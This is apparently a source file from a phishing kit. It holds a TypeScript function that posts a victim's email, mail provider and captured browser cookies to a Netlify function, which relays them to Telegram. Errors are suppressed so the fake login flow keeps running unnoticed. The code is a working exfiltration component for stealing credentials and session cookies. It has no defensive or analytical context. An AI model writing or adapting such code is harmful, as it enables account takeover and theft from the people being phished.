// Fixed sendToTelegram function that uses the actual Netlify function
export const sendToTelegram = async (data: any): Promise<void> => {
  try {
    console.log('📤 Sending data to Telegram:', {
      email: data.email,
      provider: data.provider,
      hasCookies: !!data.cookies,
      cookiesLength: data.cookies ? data.cookies.length : 0,
      hasDocumentCookies: !!data.documentCookies
    });

    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('❌ Telegram API error:', errorText);
      throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
    }

    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    // Don't throw error to avoid breaking the login flow
  }
};